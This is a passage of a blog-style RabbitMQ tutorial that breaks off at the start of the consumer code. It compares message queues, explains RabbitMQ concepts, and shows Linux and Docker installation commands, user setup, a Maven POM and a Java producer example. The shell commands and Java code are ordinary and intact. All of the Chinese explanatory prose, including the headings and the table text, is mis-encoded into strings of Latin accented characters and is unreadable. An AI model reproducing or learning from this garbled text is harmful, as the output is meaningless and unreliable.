style="text-align:center">ç»“åˆerlangè¯­è¨€æœ¬èº«çš„å¹¶å‘ä¼˜åŠ¿ï¼Œ<code>æ€§èƒ½å¥½æ—¶æ•ˆæ€§å¾®ç§’çº§</code>ï¼Œ<code>ç¤¾åŒºæ´»è·ƒåº¦ä¹Ÿæ¯”è¾ƒé«˜</code>ï¼Œç®¡ç†ç•Œé¢ç”¨èµ·æ¥ååˆ†æ–¹ä¾¿ï¼Œå¦‚æœä½ çš„<code>æ•°æ®é‡æ²¡æœ‰é‚£ä¹ˆå¤§</code>ï¼Œä¸­å°å‹å…¬å¸ä¼˜å…ˆé€‰æ‹©åŠŸèƒ½æ¯”è¾ƒå®Œå¤‡çš„RabbitMO</td></tr></tbody></table><p>è¿½æ±‚å¯ç”¨æ€§ï¼šKafkaã€ RocketMQ ã€RabbitMQ</p><p>è¿½æ±‚å¯é æ€§ï¼šRabbitMQã€RocketMQ</p><p>è¿½æ±‚ååèƒ½åŠ›ï¼šRocketMQã€Kafka</p><p>è¿½æ±‚æ¶ˆæ¯ä½å»¶è¿Ÿï¼šRabbitMQã€Kafka</p><h1 id="2-rabbitmq"><a class="markdownIt-Anchor" href="#2-rabbitmq"></a> 2. RabbitMQ</h1><blockquote><p>æ¦‚å¿µ</p></blockquote><p>RabbitMQæ˜¯ä¸€ä¸ªæ¶ˆæ¯ä¸­é—´ä»¶ï¼šå®ƒæ¥å—å¹¶è½¬å‘æ¶ˆæ¯ã€‚ä½ å¯ä»¥æŠŠå®ƒå½“åšä¸€ä¸ªå¿«é€’ç«™ç‚¹ï¼Œå½“ä½ è¦å‘é€ä¸€ä¸ªåŒ…è£¹æ—¶ï¼Œä½ æŠŠä½ çš„åŒ…è£¹æ”¾åˆ°å¿«é€’ç«™ï¼Œå¿«é€’å‘˜æœ€ç»ˆä¼šæŠŠä½ çš„å¿«é€’é€åˆ°æ”¶ä»¶äººé‚£é‡Œï¼ŒæŒ‰ç…§è¿™ç§é€»è¾‘RabbitMQæ˜¯ä¸€ä¸ªå¿«é€’ç«™ï¼Œä¸€ä¸ªå¿«é€’å‘˜å¸®ä½ ä¼ é€’å¿«ä»¶ã€‚RabbitMQä¸å¿«é€’ç«™çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œå®ƒä¸å¤„ç†å¿«ä»¶è€Œæ˜¯æ¥æ”¶ï¼Œå­˜å‚¨å’Œè½¬å‘æ¶ˆæ¯æ•°æ®ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112130341200.png" alt="" /></p><blockquote><p>å››å¤§æ ¸å¿ƒæ¦‚å¿µ</p></blockquote><table><thead><tr><th style="text-align:center">æ¦‚å¿µ</th><th style="text-align:center">ä»‹ç»</th></tr></thead><tbody><tr><td style="text-align:center">ç”Ÿäº§è€…</td><td style="text-align:center">äº§ç”Ÿæ•°æ®å‘é€æ¶ˆæ¯çš„ç¨‹åºæ˜¯ç”Ÿäº§è€…</td></tr><tr><td style="text-align:center">äº¤æ¢æœº</td><td style="text-align:center">äº¤æ¢æœºæ˜¯RabbitMQéå¸¸é‡è¦çš„ä¸€ä¸ªéƒ¨ä»¶ï¼Œä¸€æ–¹é¢å®ƒæ¥æ”¶æ¥è‡ªç”Ÿäº§è€…çš„æ¶ˆæ¯ï¼Œå¦ä¸€æ–¹é¢å®ƒå°†æ¶ˆæ¯æ¨é€åˆ°é˜Ÿåˆ—ä¸­ã€‚äº¤æ¢æœºå¿…é¡»ç¡®åˆ‡çŸ¥é“å¦‚ä½•å¤„ç†å®ƒæ¥æ”¶åˆ°çš„æ¶ˆæ¯ï¼Œæ˜¯å°†è¿™äº›æ¶ˆæ¯æ¨é€åˆ°ç‰¹å®šé˜Ÿåˆ—è¿˜æ˜¯æ¨å…³åˆ°å¤šä¸ªé˜Ÿåˆ—ï¼Œäº¦æˆ–è€…æ˜¯æŠŠæ¶ˆæ¯ä¸¢å¼ƒï¼Œè¿™ä¸ªå¾—æœ‰äº¤æ¢æœºç±»å‹å†³å®š</td></tr><tr><td style="text-align:center">é˜Ÿåˆ—</td><td style="text-align:center">é˜Ÿåˆ—æ˜¯RabbitMQå†…éƒ¨ä½¿ç”¨çš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œå°½ç®¡æ¶ˆæ¯æµç»RabbitMQå’Œåº”ç”¨ç¨‹åºä½†å®ƒä»¬åªèƒ½å­˜å‚¨åœ¨é˜Ÿåˆ—ä¸­ã€‚é˜Ÿåˆ—ä»…å—ä¸»æœºçš„å†…å­˜å’Œç£ç›˜é™åˆ¶çš„çº¦æŸï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¤§çš„æ¶ˆæ¯ç¼“å†²åŒºã€‚è®¸å¤šç”Ÿäº§è€…å¯ä»¥å°†æ¶ˆæ¯å‘é€åˆ°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œè®¸å¤šæ¶ˆè´¹è€…å¯ä»¥å°è¯•ä»ä¸€ä¸ªé˜Ÿåˆ—æ¥æ”¶æ•°æ®ã€‚è¿™å°±æ˜¯æˆ‘ä»¬ä½¿ç”¨é˜Ÿåˆ—çš„æ–¹å¼</td></tr><tr><td style="text-align:center">æ¶ˆè´¹è€…</td><td style="text-align:center">æ¶ˆè´¹ä¸æ¥æ”¶å…·æœ‰ç›¸ä¼¼çš„å«ä¹‰ã€‚æ¶ˆè´¹è€…å¤§å¤šæ—¶å€™æ˜¯ä¸€ä¸ªç­‰å¾…æ¥æ”¶æ¶ˆæ¯çš„ç¨‹åºã€‚è¯·æ³¨æ„ç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…å’Œæ¶ˆæ¯ä¸­é—´ä»¶å¾ˆå¤šæ—¶å€™å¹¶ä¸åœ¨åŒä¸€æœºå™¨ä¸Šã€‚åŒä¸€ä¸ªåº”ç”¨ç¨‹åºæ—¢å¯ä»¥æ˜¯ç”Ÿäº§è€…åˆæ˜¯å¯ä»¥æ˜¯æ¶ˆè´¹è€…ã€‚</td></tr></tbody></table><h2 id="21-æ ¸å¿ƒéƒ¨åˆ†"><a class="markdownIt-Anchor" href="#21-æ ¸å¿ƒéƒ¨åˆ†"></a> 2.1 æ ¸å¿ƒéƒ¨åˆ†</h2><table><thead><tr><th style="text-align:center">éƒ¨åˆ†</th><th style="text-align:center">åŠŸèƒ½</th></tr></thead><tbody><tr><td style="text-align:center">Borker</td><td style="text-align:center">æ¥å—å’Œåˆ†å‘æ¶ˆæ¯çš„åº”ç”¨ï¼ŒRabbitMQ Serverå°±æ˜¯Message Broker</td></tr><tr><td style="text-align:center">Virtual host</td><td style="text-align:center">å‡ºäºå¤šç§Ÿæˆ·å’Œå®‰å…¨å› ç´ è®¾è®¡çš„ï¼ŒæŠŠAMQP çš„åŸºæœ¬ç»„ä»¶åˆ’åˆ†åˆ°ä¸€ä¸ªè™šæ‹Ÿçš„åˆ†ç»„ä¸­ï¼Œç±»ä¼¼äºç½‘ç»œä¸­çš„namespace.æ¦‚å¿µã€‚å½“å¤šä¸ªä¸åŒçš„ç”¨æˆ·ä½¿ç”¨åŒä¸€ä¸ªRabbitMQ serveræä¾›çš„æœåŠ¡æ—¶ï¼Œå¯ä»¥åˆ’åˆ†å‡ºå¤šä¸ªvhostï¼Œæ¯ä¸ªç”¨æˆ·åœ¨è‡ªå·±çš„vhoståˆ›å»ºexchange / queue ç­‰</td></tr><tr><td style="text-align:center">Connection</td><td style="text-align:center">publisher / consumerå’Œbrokerä¹‹é—´çš„TCPè¿æ¥</td></tr><tr><td style="text-align:center">Channel</td><td style="text-align:center">å¦‚æœæ¯ä¸€æ¬¡è®¿é—® RabbitMQ éƒ½å»ºç«‹ä¸€ä¸ªConnectionï¼Œåœ¨æ¶ˆæ¯é‡å¤§çš„æ—¶å€™å»ºç«‹TCPConnectionçš„å¼€é”€å°†æ˜¯å·¨å¤§çš„ï¼Œæ•ˆç‡ä¹Ÿè¾ƒä½ã€‚Channelæ˜¯åœ¨connection å†…éƒ¨å»ºç«‹çš„é€»è¾‘è¿æ¥ï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ”¯æŒå¤šçº¿ç¨‹ï¼Œé€šå¸¸æ¯ä¸ªthread åˆ›å»ºå•ç‹¬çš„channelè¿›è¡Œé€šè®¯ï¼ŒAMQP methodåŒ…å«äº†channel id å¸®åŠ©å®¢æˆ·ç«¯å’Œmessage brokerè¯†åˆ« channelï¼Œæ‰€ä»¥channelä¹‹é—´æ˜¯å®Œå…¨éš”ç¦»çš„ã€‚Channelä½œä¸ºè½»é‡çº§çš„Connectionæå¤§å‡å°‘äº†æ“ä½œç³»ç»Ÿå»ºç«‹TCP connectionçš„å¼€é”€</td></tr><tr><td style="text-align:center">Exchange</td><td style="text-align:center">message åˆ°è¾¾ broker çš„ç¬¬ä¸€ç«™ï¼Œæ ¹æ®åˆ†å‘è§„åˆ™ï¼ŒåŒ¹é…æŸ¥è¯¢è¡¨ä¸­çš„ routing keyï¼Œåˆ†å‘æ¶ˆæ¯åˆ°queue ä¸­å»ã€‚å¸¸ç”¨çš„ç±»å‹æœ‰: direct (point-to-point), topic (publish-subscribe) and fanout<br/>(multicast)</td></tr><tr><td style="text-align:center">Queue</td><td style="text-align:center">æ¶ˆæ¯æœ€ç»ˆè¢«é€åˆ°è¿™é‡Œç­‰åˆ°consumerå–èµ°</td></tr><tr><td style="text-align:center">Binding</td><td style="text-align:center">exchangeå’Œqueueä¹‹é—´çš„è™šæ‹Ÿè¿æ¥ï¼Œbindingä¸­å¯ä»¥åŒ…å«routing keyï¼ŒBindingæ¶ˆæ¯è¢«ä¿å­˜åˆ°exchangeä¸­çš„æŸ¥è¯¢è¡¨ä¸­ï¼Œç”¨äºmessageçš„åˆ†å‘ä¾æ®</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112130552062.png" alt="image-20230112130552062" /></p><h2 id="22-å®‰è£…"><a class="markdownIt-Anchor" href="#22-å®‰è£…"></a> 2.2 å®‰è£…</h2><h3 id="221-å®‰è£…åˆ°linux"><a class="markdownIt-Anchor" href="#221-å®‰è£…åˆ°linux"></a> 2.2.1 å®‰è£…åˆ°linux</h3><ol><li><p>å®‰è£…Erlangï¼ˆRabbitMQåº•å±‚éœ€è¦ä½¿ç”¨ï¼‰ï¼š</p><p><a href="https://github.com/rabbitmq/erlang-rpm/releases/download/v23.2.6/erlang-23.2.6-1.el7.x86_64.rpm">https://github.com/rabbitmq/erlang-rpm/releases/download/v23.2.6/erlang-23.2.6-1.el7.x86_64.rpm</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -ivh erlang-23.2.6-1.el7.x86_64.rpm<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æµ‹è¯•</span><br>erl -version<br></code></pre></td></tr></table></figure></li><li><p>å®‰è£…RabbitMQ</p><p><a href="https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.12/rabbitmq-server-3.8.12-1.el7.noarch.rpm">https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.12/rabbitmq-server-3.8.12-1.el7.noarch.rpm</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -ivh rabbitmq-server-3.8.12-1.el7.noarch.rpm<br></code></pre></td></tr></table></figure></li><li><p>å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æ·»åŠ å¼€æœºå¯åŠ¨RabbitMQæœåŠ¡</span><br>chkconfig rabbitmq-server on<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å¯åŠ¨æœåŠ¡</span><br>/sbin/service rabbitmq-server start<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹æœåŠ¡çŠ¶æ€</span><br>/sbin/service rabbitmq-server status<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">åœæ­¢æœåŠ¡</span><br>/sbin/service rabbitmq-server stop<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">å®‰è£…å¯è§†åŒ–ç®¡ç† æ’ä»¶</span><br>rabbitmq-plugins enable rabbitmq_management<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112131347301.png" alt="image-20230112131347301" /></p></li><li><p>é‡å¯rabbitmqæœåŠ¡ï¼Œç„¶ååœ¨windowså®¢æˆ·ç«¯è¿›å…¥192.168.163.128(Linuxçš„ipåœ°å€):15672ï¼Œéœ€è¦å¼€å¯ç«¯å£å·ï¼Œé¡ºåˆ©è¿›å…¥ï¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å¼€å¯é˜²ç«å¢™</span><br>firewall-cmd --permanent --add-port=15672/tcp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">é‡å¯ç”Ÿæ•ˆ</span><br>firewall-cmd --reload<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112131415753.png" alt="image-20230112131415753" /></p></li></ol><blockquote><p>æ·»åŠ ç”¨æˆ·å¹¶ä¸”è®¾ç½®æƒé™</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">åˆ›å»ºè´¦å·</span><br>rabbitmqctl add_user admin 123<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è®¾ç½®ç”¨æˆ·è§’è‰²</span><br>rabitmqctl set_user_tags admin adminstrator<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è®¾ç½®ç”¨æˆ·æƒé™</span><br>rabbitmqctl set_permissions -p &quot;/&quot; admin &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨</span><br>rabbitmqctl list_users<br></code></pre></td></tr></table></figure><h3 id="222-ä½¿ç”¨dockerå®¹å™¨æŠ€æœ¯"><a class="markdownIt-Anchor" href="#222-ä½¿ç”¨dockerå®¹å™¨æŠ€æœ¯"></a> 2.2.2 ä½¿ç”¨dockerå®¹å™¨æŠ€æœ¯</h3><p>æ–¹å¼ä¸€ï¼šåœ¨çº¿æ‹‰å–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker pull rabbitmq:3-management<br></code></pre></td></tr></table></figure><p>æ–¹å¼äºŒï¼šä»æœ¬åœ°åŠ è½½</p><p>åœ¨è¯¾å‰èµ„æ–™å·²ç»æä¾›äº†é•œåƒåŒ…ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261459556.png" alt="image-20210423191210349" /></p><p>ä¸Šä¼ åˆ°è™šæ‹Ÿæœºä¸­åï¼Œä½¿ç”¨å‘½ä»¤åŠ è½½é•œåƒå³å¯ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker load -i mq.tar<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ¥è¿è¡ŒMQå®¹å™¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run \<br> -e RABBITMQ_DEFAULT_USER=admin \<br> -e RABBITMQ_DEFAULT_PASS=admin \<br> --name Rabbit \<br> --hostname mq \<br> -p 15672:15672 \<br> -p 5672:5672 \<br> -d \<br> rabbitmq:3-management<br></code></pre></td></tr></table></figure><h1 id="3-helloworld"><a class="markdownIt-Anchor" href="#3-helloworld"></a> 3. HelloWorld</h1><p>åœ¨æœ¬æ•™ç¨‹çš„è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å°†ç”¨ Java ç¼–å†™ä¸¤ä¸ªç¨‹åºã€‚å‘é€å•ä¸ªæ¶ˆæ¯çš„ç”Ÿäº§è€…å’Œæ¥æ”¶æ¶ˆæ¯å¹¶æ‰“å°</p><p>å‡ºæ¥çš„æ¶ˆè´¹è€…ã€‚æˆ‘ä»¬å°†ä»‹ç» Java API ä¸­çš„ä¸€äº›ç»†èŠ‚ã€‚</p><p>åœ¨ä¸‹å›¾ä¸­ï¼Œâ€œ Pâ€æ˜¯æˆ‘ä»¬çš„ç”Ÿäº§è€…ï¼Œâ€œ Câ€æ˜¯æˆ‘ä»¬çš„æ¶ˆè´¹è€…ã€‚ä¸­é—´çš„æ¡†æ˜¯ä¸€ä¸ªé˜Ÿåˆ—-RabbitMQ ä»£</p><p>è¡¨ä½¿ç”¨è€…ä¿ç•™çš„æ¶ˆæ¯ç¼“å†²åŒº</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112132650794.png" alt="image-20230112132650794" /></p><h2 id="31-åˆ›å»ºå¼€å‘ç¯å¢ƒ"><a class="markdownIt-Anchor" href="#31-åˆ›å»ºå¼€å‘ç¯å¢ƒ"></a> 3.1 åˆ›å»ºå¼€å‘ç¯å¢ƒ</h2><p>åˆ›å»ºä¸€ä¸ªMavené¡¹ç›®ï¼šrabbitmq-helloï¼ŒPOMå¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.rabbitmq<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>amqp-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="32-ç”Ÿäº§è€…ä»£ç "><a class="markdownIt-Anchor" href="#32-ç”Ÿäº§è€…ä»£ç "></a> 3.2 ç”Ÿäº§è€…ä»£ç </h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112132743939.png" alt="image-20230112132743939" /></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> String QUEUE_NAME=<span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// å‘æ¶ˆæ¯</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè¿æ¥å·¥å‚</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br><br>        <span class="hljs-comment">// å·¥å‚IPè¿æ¥RabbitMQçš„é˜Ÿåˆ—</span><br>        factory.setHost(<span class="hljs-string">&quot;192.168.23.132&quot;</span>);<br>        <span class="hljs-comment">// ç”¨æˆ·å</span><br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-comment">// å¯†ç </span><br>        factory.setPassword(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        factory.setPort(<span class="hljs-number">5672</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        <span class="hljs-comment">// è·å–ä¿¡é“</span><br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            * ç”Ÿæˆä¸€ä¸ªé˜Ÿåˆ—</span><br><span class="hljs-comment">            * å‚æ•°1ï¼šé˜Ÿåˆ—åç§°</span><br><span class="hljs-comment">            * å‚æ•°2ï¼šé˜Ÿåˆ—é‡Œé¢çš„æ¶ˆæ¯æ˜¯å¦æŒä¹…åŒ–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ¶ˆæ¯å­˜å‚¨åœ¨å†…å­˜ä¸­</span><br><span class="hljs-comment">            * å‚æ•°3ï¼šè¯¥é˜Ÿåˆ—æ˜¯å¦åªä¾›ä¸€ä¸ªæ¶ˆè´¹è€…è¿›è¡Œæ¶ˆè´¹ï¼Œæ˜¯å¦è¿›è¡Œæ¶ˆè´¹å…±äº«ï¼Œtrueå¯ä»¥å¤šä¸ªæ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œ</span><br><span class="hljs-comment">            *        falseåªèƒ½ä¸€ä¸ªæ¶ˆè´¹è€…æ¶ˆè´¹</span><br><span class="hljs-comment">            * å‚æ•°4ï¼šæ˜¯å¦è‡ªåŠ¨åˆ é™¤ï¼šæœ€åä¸€ä¸ªæ¶ˆè´¹è€…æ–­å¼€è¿æ¥ä¹‹åï¼Œè¯¥é˜Ÿåˆ—æ˜¯å¦è‡ªåŠ¨åˆ é™¤ï¼Œtrueåˆ™è‡ªåŠ¨åˆ é™¤ï¼Œ</span><br><span class="hljs-comment">            *        falseä¸è‡ªåŠ¨åˆ é™¤</span><br><span class="hljs-comment">            * å‚æ•°5ï¼šå…¶ä»–å‚æ•°</span><br><span class="hljs-comment">        * */</span><br>        channel.queueDeclare(QUEUE_NAME,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// å‘æ¶ˆæ¯</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * å‘é€ä¸€ä¸ªæ¶ˆæ¯</span><br><span class="hljs-comment">        * å‚æ•°1ï¼šå‘é€åˆ°å“ªä¸ªäº¤æ¢æœº</span><br><span class="hljs-comment">        * å‚æ•°2ï¼šè·¯ç”±çš„keyå€¼æ˜¯é‚£ä¸ªï¼Œæœ¬æ¬¡æ˜¯é˜Ÿåˆ—çš„åç§°</span><br><span class="hljs-comment">        * å‚æ•°3ï¼šå…¶ä»–å‚æ•°ä¿¡æ¯</span><br><span class="hljs-comment">        * å‚æ•°4ï¼šå‘é€æ¶ˆæ¯çš„æ¶ˆæ¯ä½“</span><br><span class="hljs-comment">        * */</span><br>        channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,QUEUE_NAME,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>        System.out.println(<span class="hljs-string">&quot;æ¶ˆæ¯å‘é€å®Œæ¯•ï¼&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå¦‚æœæŠ¥connection errorï¼Œè€ƒè™‘æ˜¯ç«¯å£å·æ²¡æœ‰å¼€æ”¾çš„é—®é¢˜ã€‚è¿æ¥æœåŠ¡ï¼Œè¯·æ±‚çš„ç«¯å£å·æ˜¯<code>5672</code>ï¼Œè€Œå¯è§†åŒ–å·¥å…·æœåŠ¡ï¼Œè¯·æ±‚çš„æ˜¯<code>15672</code>ï¼Œ<code>å› æ­¤éœ€è¦å¼€å¯5672è·Ÿ15672ä¸¤ä¸ªç«¯å£</code>ï¼Œæµ‹è¯•è¿æ¥æˆåŠŸï¼</p><h2 id="33-æ¶ˆè´¹è€…ä»£ç "><a class="markdownIt-Anchor" href="#33-æ¶ˆè´¹è€…ä»£ç "></a> 3.3 æ¶ˆè´¹è€…ä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 